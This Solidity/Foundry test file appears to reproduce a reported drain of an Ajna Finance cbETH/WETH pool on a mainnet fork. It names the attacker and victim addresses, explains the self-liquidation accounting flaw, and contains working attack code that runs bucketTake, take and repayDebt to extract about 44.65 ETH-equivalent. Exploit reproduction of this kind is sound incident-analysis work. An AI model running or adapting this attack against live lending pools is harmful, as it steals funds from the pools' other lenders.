// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Ajna Finance — Ethereum mainnet — self-controlled-liquidation drain via bucketTake/take accounting.
//
// ~$775K total across 7 Ajna ERC20 pools in one campaign the same day (syrupUSDC $173.7K,
// wstETH $159.8K, rETH $127.4K + $15.6K, cbETH $124.8K + $12.1K, WBTC $101.8K, WETH/USDC $42.0K,
// sDAI $18.0K). Same bug class every pool, so reproducing the cbETH instance is enough.
//
// Sample tx   : 0x12dfde527ef62882bfabb64362c9ae0e6bfb628363bd298d0d0956c9a114e4f5 (block 25854888)
// Attacker EOA: 0x6F2f5236b10FE7162Da077A2779f8b5f04b7827e
// Victim pool : 0xad24FC773e125Edb223C38a39657cB64bc7C178e (Ajna ERC20Pool, cbETH/WETH;
//               logic impl ERC20Pool 0x05bB4F6362B02F17C1A3F2B047A8b23368269A21)
//   collateral: cbETH 0xBe9895146f7AF43049ca1c1AE358B0541Ea49704
//   quote     : WETH  0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
// Attacker-controlled borrower position : 0x02D329Ebb1DA079A89988366b777aF300DB96F5f
//
// Root cause (verified against the on-chain trace and Ajna's verified ERC20Pool source, NOT a
// key/signer/admin path): Ajna is permissionless and oracle-free by design — auction and bucket
// prices come only from the pool's own internal state, with no external feed to contradict them.
// An attacker who controls BOTH sides of a liquidation (its own over-leveraged borrower AND the
// taker/lender liquidating it) shapes the internal prices those sides interact at and walks out
// with more collateral value than the quote it pays in. That loss lands on the pool's other
// lenders. bucketTake, take, removeCollateral and repayDebt are all plain permissionless public
// functions; the `validate(...)` staticcall to 0x5508… seen in the trace is the attacker
// contract's OWN tx.origin auth check, not an Ajna-side gate.
//
// Standing state at the fork (established by the attacker's earlier setup txs, present at block-1):
// borrower 0x02D329 sits in an active Dutch-auction liquidation (debt 49.36 WETH, collateral 48.13
// cbETH), and Fenwick bucket 2000 holds ~49.34 WETH of the attacker's own deposit.
//
// This PoC reconstructs the drain as ordinary typed Ajna calls (no bytecode blob, no raw calldata
// replay of the original 0xf1cd0d25 payload, no redeploy of the attacker contract 0x80AD…):
//   1. Taker.bucketTake(borrower, false, 2000): consume the bucket's quote deposit to repay most of
//      the borrower's debt at the manipulated bucket price and award the taker bucket LP
//      (debt 49.36 -> 3.47 WETH), then removeCollateral(max, 2000) pulls the awarded cbETH out.
//   2. take(borrower, max, taker, ""): clear the residual 3.47 WETH of debt, settling the auction.
//   3. As the attacker-controlled borrower, repayDebt(borrower, 0, collateral, taker, idx): pull the
//      now-freed ~46.5 cbETH of collateral straight out to the taker.
// Net: the taker ends holding ~48.13 cbETH for ~3.47 WETH paid — ~44.65 ETH-equivalent (~$124.8K).
// The on-chain tx realized the same value split differently (~43.75 cbETH + ~1.5 WETH net) because
// it funded its take through a Balancer flash loan plus a cbETH->WETH swap; that financing is
// economically neutral, so this PoC takes the simpler cash-funded path and asserts the same net
// value. The attacker-controlled borrower side is driven via a prank of its standing position,
// modeling the "attacker controls both sides" structure without replaying any hardcoded calldata.
//
// forge test --contracts src/test/2026-08/AjnaFinance_exp.sol -vvv

interface IAjnaPool {
    function bucketTake(
        address borrower,
        bool depositTake,
        uint256 index
    ) external;
    function removeCollateral(
        uint256 maxAmount,
        uint256 index
    ) external returns (uint256, uint256);
    function take(
        address borrower,
        uint256 maxAmount,
        address callee,
        bytes calldata data
    ) external;
    function repayDebt(
        address borrower,
        uint256 maxQuoteTokenAmountToRepay,
        uint256 collateralAmountToPull,
        address collateralReceiver,
        uint256 limitIndex
    ) external;
    function borrowerInfo(
        address borrower
    ) external view returns (uint256 debt, uint256 collateral, uint256 t0Np);
    function auctionInfo(
        address borrower
    )
        external
        view
        returns (address, uint256, uint256, uint256 kickTime, uint256, uint256, address, address, address, bool);
}

// The liquidating side: a named taker/lender contract making real Ajna calls.
contract AjnaTaker {
    IAjnaPool internal constant POOL = IAjnaPool(0xad24FC773e125Edb223C38a39657cB64bc7C178e);
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 internal constant BUCKET = 2000;

    // Consume bucket 2000's quote deposit to repay most of the borrower's debt at the manipulated
    // bucket price, award ourselves the bucket LP, and pull the collateral out.
    function bucketTakeLeg(
        address borrower
    ) external {
        IERC20(WETH).approve(address(POOL), type(uint256).max);
        POOL.bucketTake(borrower, false, BUCKET);
        POOL.removeCollateral(type(uint256).max, BUCKET);
    }

    // Clear the residual debt with a plain take, settling the auction so the collateral can be freed.
    function settleLeg(
        address borrower
    ) external {
        POOL.take(borrower, type(uint256).max, address(this), "");
    }
}

contract AjnaFinance_exp is BaseTestWithBalanceLog {
    IAjnaPool internal constant POOL = IAjnaPool(0xad24FC773e125Edb223C38a39657cB64bc7C178e);
    IERC20 internal constant cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    IERC20 internal constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address internal constant BORROWER = 0x02D329Ebb1DA079A89988366b777aF300DB96F5f; // attacker-controlled
    uint256 internal constant BUCKET = 2000;

    uint256 internal constant FORK_BLOCK = 25_854_887; // parent of the exploit block 25854888

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(address(POOL), "AjnaCbethPool");
        vm.label(BORROWER, "AttackerBorrower");
        vm.label(address(cbETH), "cbETH");
        vm.label(address(WETH), "WETH");
    }

    function testExploit() public {
        AjnaTaker taker = new AjnaTaker();
        // Working capital for the residual-debt take (the on-chain attacker flash-loaned it).
        deal(address(WETH), address(taker), 100 ether);

        // 1. bucketTake + removeCollateral: repays most of the debt, pulls the first cbETH slice.
        taker.bucketTakeLeg(BORROWER);
        // 2. take: clears the residual debt and settles the auction.
        taker.settleLeg(BORROWER);

        // 3. The attacker-controlled borrower pulls its now-freed collateral out to the taker.
        (, uint256 freedCollateral,) = POOL.borrowerInfo(BORROWER);
        (,,, uint256 kickTime,,,,,,) = POOL.auctionInfo(BORROWER);
        assertEq(kickTime, 0, "auction not settled before pulling collateral");
        vm.prank(BORROWER);
        POOL.repayDebt(BORROWER, 0, freedCollateral, address(taker), 7388);

        uint256 cbEthGain = cbETH.balanceOf(address(taker));
        uint256 wethSpent = 100 ether - WETH.balanceOf(address(taker));
        emit log_named_decimal_uint("taker cbETH gained", cbEthGain, 18);
        emit log_named_decimal_uint("taker WETH spent", wethSpent, 18);

        // Net extracted value, in ETH terms (cbETH ~ WETH ~ ETH). Reported ~$124.8K for this pool.
        uint256 netEth = cbEthGain - wethSpent;
        emit log_named_decimal_uint("net ETH-equivalent drained", netEth, 18);

        assertGe(cbEthGain, 43.75 ether, "expected >= the reported ~43.75 cbETH collateral seized");
        assertApproxEqAbs(netEth, 44.65 ether, 2 ether, "net drain off the reported ~$124.8K");
    }
}
